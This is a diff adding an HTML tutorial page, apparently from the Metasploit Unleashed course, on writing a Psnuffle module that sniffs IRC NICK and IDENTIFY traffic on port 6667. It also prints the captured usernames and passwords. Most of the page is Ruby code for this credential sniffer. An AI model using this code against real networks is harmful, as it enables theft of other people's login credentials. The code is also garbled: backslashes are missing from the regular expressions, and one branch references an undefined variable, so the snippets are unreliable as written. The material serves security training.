@@ -1,0 +1,65 @@
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
+<html>
+<head>
+  <meta content="text/html; charset=ISO-8859-1"
+ http-equiv="Content-Type">
+  <title>Extending Psnuffle</title>
+</head>
+<body>
+<h1 style="color: rgb(0, 0, 0);" id="firstHeading" class="firstHeading">Extending
+Psnuffle</h1>
+<h3 style="color: rgb(0, 0, 0);" id="siteSub">From Metasploit Unleashed
+- Mastering The Framework</h3>
+<p style="color: rgb(0, 0, 0);">Psnuffle is easy to extend due to its
+modular design. This section
+will guide through the process of developing an IRC (Internet Relay
+Chat) protocol sniffer (Notify and Nick messages).
+<br>
+</p>
+<h4 style="color: rgb(0, 0, 0);"> <span class="mw-headline"
+ id="Module_Location">Module Location</span></h4>
+<p style="color: rgb(0, 0, 0);">All the different modules are located
+in data/exploits/psnuffle. The
+names are corresponding to the protocol names used inside psnuffle. To
+develop our own module, we take a look at the important parts of the
+existing pop3 sniffer module as a template.
+</p>
+<p style="color: rgb(0, 0, 0);">Pattern definitions:
+</p>
+<pre style="color: rgb(0, 0, 0);">self.sigs = {<br>:ok =&gt; /^(+OK[^n]*)n/si,<br>:err =&gt; /^(-ERR[^n]*)n/si,<br>:user =&gt; /^USERs+([^n]+)n/si,<br>:pass =&gt; /^PASSs+([^n]+)n/si,<br>:quit =&gt; /^(QUITs*[^n]*)n/si }</pre>
+<p style="color: rgb(0, 0, 0);">This section defines the expression
+patterns which will be used
+during sniffing to identify interesting data. Regular expressions look
+very strange at the beginning but are very powerful. In short
+everything within () will be available within a variable later on in
+the script.
+</p>
+<pre style="color: rgb(0, 0, 0);">self.sigs = {<br>:user =&gt; /^(NICKs+[^n]+)/si,<br>:pass =&gt; /b(IDENTIFYs+[^n]+)/si,}</pre>
+<p style="color: rgb(0, 0, 0);">For IRC this section would look like
+the ones above. Yeah i know not
+all nickservers are using IDENTIFY to send the password, but the one on
+freenode does. Hey its an example&nbsp;:-)
+</p>
+<h4 style="color: rgb(0, 0, 0);"> <span class="mw-headline"
+ id="Session_definition">Session definition</span></h4>
+<p style="color: rgb(0, 0, 0);">For every module we first have to
+define what ports it should handle and how the session should be
+tracked.
+</p>
+<pre style="color: rgb(0, 0, 0);">return if not pkt[:tcp] # We don't want to handle anything other than tcp<br>return if (pkt[:tcp].src_port != 6667 and pkt[:tcp].dst_port != 6667) # Process only packet on port 6667<br><br>#Ensure that the session hash stays the same for both way of communication<br>if (pkt[:tcp].dst_port == 6667) # When packet is sent to server<br>s = find_session("#{pkt[:ip].dst_ip}:#{pkt[:tcp].dst_port}-#{pkt[:ip].src_ip}:#{pkt[:tcp].src_port}")<br>else # When packet is coming from the server<br>s = find_session("#{pkt[:ip].src_ip}:#{pkt[:tcp].src_port}-#{pkt[:ip].dst_ip}:#{pkt[:tcp].dst_port}")<br>end</pre>
+<p style="color: rgb(0, 0, 0);"><br>
+Now that we have a session object that uniquely consolidates
+info, we can go on and process packet content that matched one of the
+regular expressions we defined earlier.
+</p>
+<pre style="color: rgb(0, 0, 0);">case matched<br>when :user # when the pattern "/^(NICKs+[^n]+)/si" is matching the packet content<br>s[:user]=matches #Store the name into the session hash s for later use<br># Do whatever you like here... maybe a puts if you need to<br>when :pass # When the pattern "/b(IDENTIFYs+[^n]+)/si" is matching<br>s[:pass]=matches # Store the password into the session hash s as well<br>if (s[:user] and s[:pass]) # When we have the name and the pass sniffed, print it<br>print "-&gt; IRC login sniffed: #{s[:session]} &gt;&gt; username:#{s[:user]} password:#{s[:pass]}n"<br>end<br>sessions.delete(s[:session]) # Remove this session because we dont need to track it anymore<br>when nil<br># No matches, don't do anything else # Just in case anything else is matching...<br>sessions[s[:session]].merge!({k =&gt; matches}) # Just add it to the session object<br>end</pre>
+<p style="color: rgb(0, 0, 0);">That's basically it. Download the full
+script here.
+<br>
+<br>
+</p>
+<div style="text-align: center; color: rgb(0, 0, 0);"><a
+ href="http://www.offensive-security.com/metasploit-unleashed/Password_Sniffing"
+ title="Password Sniffing">Password Sniffing</a></div>
+</body>
+</html>
